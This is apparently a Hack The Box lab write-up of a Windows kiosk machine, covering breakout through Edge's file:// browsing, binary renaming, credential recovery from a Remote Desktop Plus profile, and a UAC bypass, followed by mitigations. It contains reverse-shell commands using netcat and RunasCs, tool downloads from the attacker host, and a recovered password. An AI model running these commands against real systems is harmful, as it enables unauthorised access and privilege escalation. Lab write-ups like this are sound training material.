# Write-Up: VulnEscape - Easy | [Machines](../../../MACHINES.md)

>  Platform: Hack The Box\
>  OS: Windows\
>  Difficulty: Easy\
>  Author: Fokos Nikolaos\
>  Completion Date: 08-08-2025\
>  Objective: Capture `user.txt` and `root.txt` flags

---

# Banner

![alt text](images/banner.png)

---

# Summary

The *VulnEscape* machine presented a Windows-based kiosk environment accessible via *Remote Desktop Protocol (RDP)*. Initial access was obtained by exploiting the Microsoft Edge browser's permissive handling of the `file://` protocol, enabling local file system traversal. This allowed for the discovery and execution of `powershell.exe` after bypassing execution restrictions through binary renaming. Privilege escalation was achieved by locating a misconfigured `profiles.xml` file from *Remote Desktop Plus*, extracting stored administrative credentials, and leveraging *RunasCs* with UAC bypass to obtain an elevated shell. The challenge demonstrated real-world kiosk breakout techniques, credential harvesting from insecure configuration files, and bypassing *Windows User Account Control*.

---

## Target Enumeration

### Nmap scan

Starting with the machine enumeration, a nmap scan is initiated to discover open ports in the target's ip.

#### Parameters:
- `-sV` Initiate a version scan for found services.
- `-sC` Execute default scripts from Nmap Scripting Engine (NSE).
- `-Pn` Treat all hosts as online -- skip host discovery.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.129.234.51
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 08:33 EDT
Nmap scan report for 10.129.234.51
Host is up (0.080s latency).                                                                                              
Not shown: 999 filtered tcp ports (no-response)                                                                           
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services                                                                  
| rdp-ntlm-info:
|   Target_Name: ESCAPE                                                                                                   
|   NetBIOS_Domain_Name: ESCAPE
|   NetBIOS_Computer_Name: ESCAPE
|   DNS_Domain_Name: Escape
|   DNS_Computer_Name: Escape
|   Product_Version: 10.0.19041
|_  System_Time: 2025-08-05T12:33:39+00:00
|_ssl-date: 2025-08-05T12:33:44+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Escape
| Not valid before: 2025-04-10T06:20:36
|_Not valid after:  2025-10-10T06:20:36
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.26 seconds
```

#### Results:
- `3389/tcp: ms-wbt-server - Microsoft Terminal Services`

---

## Target Enumeration

Knowing that port `3389` is open, a remote desktop session can be initiated, using tools like `xfreerdp3` or `evil-winrm`.

```bash
┌──(kali㉿kali)-[~]
└─$ xfreerdp3 /v:10.129.234.51 /sec:nla:off
[08:32:31:381] [61705:0000f10a] [INFO][com.freerdp.client.x11] - [xf_pre_connect]: No user name set. - Using login name: kali
[08:32:31:399] [61705:0000f10a] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x08 -> no RDP scancode found
[08:32:31:399] [61705:0000f10a] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x5D -> no RDP scancode found
Domain:          
Password:        
[08:32:33:789] [61705:0000f10a] [WARN][com.freerdp.crypto] - [verify_cb]: Certificate verification failure 'self-signed certificate (18)' at stack position 0
[08:32:33:789] [61705:0000f10a] [WARN][com.freerdp.crypto] - [verify_cb]: CN = Escape
[08:32:34:329] [61705:0000f10a] [WARN][com.freerdp.core.connection] - [rdp_client_connect_auto_detect]: expected messageChannelId=1008, got 1003
[08:32:34:329] [61705:0000f10a] [WARN][com.freerdp.core.license] - [license_read_binary_blob_data]: license binary blob::type BB_ERROR_BLOB, length=0, skipping.
[08:32:34:376] [61705:0000f10a] [WARN][com.freerdp.core.connection] - [rdp_client_connect_auto_detect]: expected messageChannelId=1008, got 1003
[08:32:34:485] [61705:0000f10a] [INFO][com.freerdp.gdi] - [gdi_init_ex]: Local framebuffer format  PIXEL_FORMAT_BGRX32
[08:32:34:485] [61705:0000f10a] [INFO][com.freerdp.gdi] - [gdi_init_ex]: Remote framebuffer format PIXEL_FORMAT_BGRA32
[08:32:34:681] [61705:0000f10a] [INFO][com.freerdp.channels.rdpsnd.client] - [rdpsnd_load_device_plugin]: [static] Loaded fake backend for rdpsnd
[08:32:34:681] [61705:0000f10a] [INFO][com.freerdp.channels.drdynvc.client] - [dvcman_load_addin]: Loading Dynamic Virtual Channel ainput
[08:32:34:681] [61705:0000f10a] [INFO][com.freerdp.channels.drdynvc.client] - [dvcman_load_addin]: Loading Dynamic Virtual Channel rdpgfx
[08:32:34:681] [61705:0000f10a] [INFO][com.freerdp.channels.drdynvc.client] - [dvcman_load_addin]: Loading Dynamic Virtual Channel disp
[08:32:34:681] [61705:0000f10a] [INFO][com.freerdp.channels.drdynvc.client] - [dvcman_load_addin]: Loading Dynamic Virtual Channel rdpsnd
[08:32:35:059] [61705:0000f143] [INFO][com.freerdp.channels.rdpsnd.client] - [rdpsnd_load_device_plugin]: [dynamic] Loaded fake backend for rdpsnd
```

After executing `xfreerdp`, specifying the target machine to establish a remote desktop connection, a windows pops, with an informational message. The message informs us to use `KioskUser0` to login. Logging in with the requested user, we find a restricted Windows environment, with a text on the background `Busan Expo`. Since the user is named `Kiosk` this is probably a display machine.

Enumerating further our target, we try pressing Windows Special keys like `CTRL + E`, `CTRL + SHIFT + ESC`, `WINDOWS + R` but none seem to work.

Pressing the `WINDOWS` (or `SUPER`) key, the Start Menu appears. Trying to execute a program doesn't seem to work probably due to UAC (User Account Control) restrictions.

Further experimentation and exploration of the system, leads to Microsoft Edge. The `msedge.exe` executable is allowed to run.

---

## Exploitation

Exploring the browser, we navigate to the corresponding "About" page that reports the programs' current version: `137.0.3296.93`.

Searching the web for known Edge exploits, had no result.

With a bit of tinkering, we find that `file://` can be used for directory traversal besides PDF file read. 

Trying to parse `file://C:` as input to the address bar, we can now browse the filesystem.

Searching for `powershell.exe` under `C:\Windows\System32\WindowsPowerShell\v1.0\`, we locate the program and "download" it. The program has been essentially copied to the Downloads directory. Trying to execute it has no result due to UAC, but we can bypass this restriction renaming as the allowed `msedge.exe`. Since we can't open the Explorer, on edge we go to `Show in folder`. Having an Explorer open, we rename the `powershell.exe` to `msedge.exe` and can now execute the program, granting a console.

---

## User Flag

Having a console, allow us to browse the system with more ease. Searching the user directory under `C:\Users\` we locate the `kioskuser0`.

```powershell
PS C:\> cd Users
PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/3/2024   2:39 AM                admin
d-----         6/25/2025   2:45 AM                Administrator
d-----          2/3/2024   3:12 AM                DefaultAppPool
d-----          2/3/2024   3:10 AM                kioskUser0
d-r---          2/3/2024   2:38 AM                Public
```

We change directory to kioskUser0 with `cd kioskUser0`, and the `user.txt` flag can be found under `C:\Users\kioskUser0\Desktop\`.

---

## Root Flag

We continue searching the system for more information. 

We find under `C:\` a **hidden** directory named `_admin`

```powershell
PS C:\> gci -force 


    Directory: C:\ 
    

Mode                 LastWriteTime         Length Name 
----                 -------------         ------ ---- 
d--hs-          2/4/2024  12:52 AM                $Recycle.Bin 
d--h--         6/24/2025   8:23 AM                $WinREAgent 
d--hsl          2/3/2024  11:32 AM                Documents and Settings 
d-----          2/3/2024   3:11 AM                inetpub 
d-----         12/7/2019   1:14 AM                PerfLogs 
d-r---         4/10/2025  11:29 PM                Program Files 
d-r---          2/3/2024   3:03 AM                Program Files (x86) 
d--h--         6/24/2025   8:06 AM                ProgramData 
d--hs-         10/1/2024  11:40 PM                Recovery 
d--hs-         6/16/2025   4:42 AM                System Volume Information
d-----          8/8/2025   1:20 PM                temp 
d-r---          2/3/2024   3:43 AM                Users 
d-----         6/24/2025   1:24 PM                Windows 
d--h--          2/3/2024   3:05 AM                _admin 
-a-hs-          2/4/2024   1:35 AM           8192 DumpStack.log 
-a-hs-          8/8/2025  12:28 PM           8192 DumpStack.log.tmp
-a-hs-         10/1/2024  11:48 PM     2093002752 hiberfil.sys 
-a-hs-          8/8/2025  12:28 PM     1476395008 pagefile.sys 
-a-hs-          8/8/2025  12:28 PM       16777216 swapfile.sys                           
```

Inside the directory, we find other directories that seem to be empty and only one readable file `profiles.xml`.

```powershell
PS C:\> cd '_admin'
PS C:\_admin> gci -force


    Directory: C:\_admin


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/3/2024   3:04 AM                installers
d-----          2/3/2024   3:05 AM                passwords
d-----          2/3/2024   3:05 AM                temp
-a----          2/3/2024   3:03 AM              0 Default.rdp
-a----          2/3/2024   3:04 AM            574 profiles.xml
```

Printing the contents of `profiles.xml`, we find a configuration, including credentials, that seem to be used for the `Remote Desktop Plus` program.

```powershell
PS C:\_admin> more profiles.xml
<?xml version="1.0" encoding="utf-16"?>
<!-- Remote Desktop Plus -->
<Data>
  <Profile>
    <ProfileName>admin</ProfileName>
    <UserName>127.0.0.1</UserName>
    <Password>JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>
    <Secure>False</Secure>
  </Profile>
</Data>
```

Searching the system for the program, we locate it under `C:\Program Files (x86)\Remote Desktop Plus\`.

```powershell
PS C:\_admin> cd ..
PS C:\> cd 'Program Files (x86)'
PS C:\Program Files (x86)> cd '.\Remote Desktop Plus\'
PS C:\Program Files (x86)\Remote Desktop Plus> dir


    Directory: C:\Program Files (x86)\Remote Desktop Plus


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/13/2018  10:47 PM         267264 rdp.exe
```

Executing the program, pops a window, for remote connections. We can import the previously found `profiles.xml` configuration. To do this we go under `Profiles > Manage profiles... > Import and export > Import profiles...`. The `explorer.exe` opens, but shows us limited directories to import the configuration from, to just only `Downloads`. We take a step back on our PowerShell, to copy the files under `_admin` to `Downloads`.

```powershell
PS C:\Program Files (x86)\Remote Desktop Plus> cd C:\
PS C:\> cd '_admin'
PS C:\_admin> cp -r * ..\Users\kioskUser0\Downloads
PS C:\_admin> dir ..\Users\kioskUser0\Downloads


    Directory: C:\Users\kioskUser0\Downloads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/8/2025   2:52 PM                installers
d-----          8/8/2025   2:52 PM                passwords
d-----          8/8/2025   2:52 PM                temp
-a----          2/3/2024   3:03 AM              0 Default.rdp
-a----          8/8/2025  12:49 PM         455680 msedge.exe
-a----          2/3/2024   3:04 AM            574 profiles.xml
```

Having `profiles.xml` on our `Downloads` directory we can now proceed and import the configuration. We still need to enter a computer name. Assuming this means the hostname, we execute on our PowerShell `hostname` and find the computer's name `Escape`.

```powershell
PS C:\_admin> hostname
Escape
```

Entering `Escape` as a computer name, on the appropriate field, an unknown error appears, immediately crashing `rdp.exe`.

Executing again the program, importing the same `admin` configuration, we notice the entered credentials. The password field is replaced with asterisk characters, but we can view it using a utility called "BulletsPassView". To do that, we'll need to download the tool from the web on a temporary server, and parse it to the Windows machine using a local server.

We open a terminal, and setup a python local server on our hosts current directory e.g. `/home/kali/Downloads/. 

```bash
python3 -m http.server
```

From the target machine, we can download the `BulletsPassView.exe` using `wget`.

```powershell
PS C:\> mkdir temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/8/2025   3:27 PM                temp


PS C:\> cd temp
PS C:\temp> wget http://10.10.14.176:8000/bulletspassview-x64/BulletsPassView.exe -O bfv.exe
```

On Remote Desktop Plus, we go to `Manage profiles... > admin > Edit...`, switching to `BulletsPassView.exe` reveals the password `Twisting3021` on window title `Edit profile`.

Using these credentials, we can connect remotely from our machine. To do that, we'll need `RunasCs` and `netcat`.

We open a listener on our host.

```bash
nc -lvnp 8888
```

We download `RunasCs` and `netcat` on the directory our python http server is running. Next we fetch these two programs on the target's machine with `wget`. 

```powershell
PS C:\temp> wget http://10.10.14.176:8000/RunasCs/RunasCs.exe -O runascs.exe
PS C:\temp> wget http://10.10.14.176:8000/netcat-1.11/nc64.exe -O nc64.exe
```

Having the two programs, we'll need to connect with RunasCs as `admin` and bind `cmd.exe` to our listener.

```powershell
PS C:\temp> ./runascs.exe admin Twisting3021 "C:\temp\nc64.exe 10.10.14.176 8888 -e
cmd.exe"
```

We successfully login to our target's machine `cmd.exe`.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.176] from (UNKNOWN) [10.129.234.51] 51099
Microsoft Windows [Version 10.0.19045.5965]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

After executing the PowerShell command, we get a warning prompt warning us about, limitations on the `admin` user. 

```powershell
PS C:\temp> .\runascs.exe admin Twisting3021 "C:\temp\nc64.exe 10.10.14.176 8888 -e cmd.exe"
[*] Warning: The logon for user 'admin' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

No output received from the process.
```

We stop our listener, re-executing the `nc` command, adding the parameter `--bypass-uac` this time.

```powershell
PS C:\temp> .\runascs.exe admin Twisting3021 "C:\temp\nc64.exe 10.10.14.176 8888 -e cmd.exe" --bypass-uac
```

We check our listener, and have a `cmd.exe` with **Administrator** privileges running.

The `root.txt` flag can be found under `C:\Users\Administrator\Desktop\`

---

## Vulnerabilities

- ***Kiosk Environment Breakout via Microsoft Edge file:// Protocol***
    - **Type**: Local File System Access / Kiosk Mode Escape

    - **Description**: The Edge browser allowed access to arbitrary local files through the file:// protocol, enabling navigation to system directories and execution of unauthorized binaries.

    - **Impact**: Complete bypass of kiosk application restrictions, enabling command execution.

    - **Mitigation**: Restrict or disable file:// access in kiosk browsers; whitelist accessible paths; enforce application whitelisting with AppLocker or WDAC.

- ***Execution Restriction Bypass through Binary Renaming***
    - **Type**: Application Whitelisting Bypass

    - **Description**: powershell.exe execution was blocked by UAC policies, but renaming it to msedge.exe (an allowed application) bypassed execution controls.

    - **Impact**: Enabled interactive PowerShell access from a restricted environment.

    - **Mitigation**: Enforce application control policies by file hash/signature rather than filename; restrict write access to executable directories.

- ***Insecure Storage of Administrative Credentials in profiles.xml***
    - **Type**: Credential Storage in Plaintext / Weak Encryption

    - **Description**: The Remote Desktop Plus configuration file contained an encoded administrative password, which could be extracted with publicly available tools.

    - **Impact**: Disclosure of valid administrative credentials, enabling lateral movement and privilege escalation.

    - **Mitigation**: Store credentials securely using Windows Credential Manager or DPAPI; restrict access to configuration files; enforce least privilege.

- ***Privilege Escalation via UAC Bypass in RunasCs***
    - **Type**: User Account Control (UAC) Bypass

    - **Description**: The administrative account required UAC elevation for full privileges, which was bypassed using RunasCs with the --bypass-uac flag.

    - **Impact**: Obtained full SYSTEM-level access to the target.

    - **Mitigation**: Configure UAC to require credentials for elevation; monitor and restrict execution of known UAC bypass tools; apply the latest security updates.

---

## Learning Outcome

Through the exploitation of VulnEscape, the following key skills and concepts were reinforced:

- ***Kiosk Mode Breakout Techniques***
    - Identifying and exploiting weaknesses in restricted Windows environments.
    - Leveraging browser protocols (file://) for local file system traversal.

- ***Application Whitelisting Evasion***
    - Understanding execution restriction mechanisms in Windows.
    - Bypassing file-based allowlists through binary renaming to trusted application names.

- ***Credential Harvesting from Insecure Storage***
    - Locating sensitive configuration files (profiles.xml) containing credentials.
    - Using specialized tools (e.g., BulletsPassView) to decode stored or masked passwords.

- ***Privilege Escalation in Windows Environments***
    - Exploiting UAC misconfigurations to elevate privileges.
    - Utilizing tools like RunasCs with --bypass-uac for administrative access.

- ***Operational Security Considerations***
    - Understanding the security impact of misconfigured kiosk systems and poorly protected administrative accounts.
    - Identifying mitigation strategies to harden Windows environments against similar attacks.

---

## Tools Used

`nmap`, `xfreerdp3`, `netcat`, `python`, `wget`

---

## References

- [Microsoft Edge – Configure Kiosk Mode](https://learn.microsoft.com/en-us/deployedge/microsoft-edge-configure-kiosk-mode)
- [Microsoft Docs – AppLocker Overview](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-overview)
- [RunasCs GitHub Repository](https://github.com/antonioCoco/RunasCs)
- [BulletsPassView – NirSoft](https://www.nirsoft.net/utils/bullets_password_view.html)



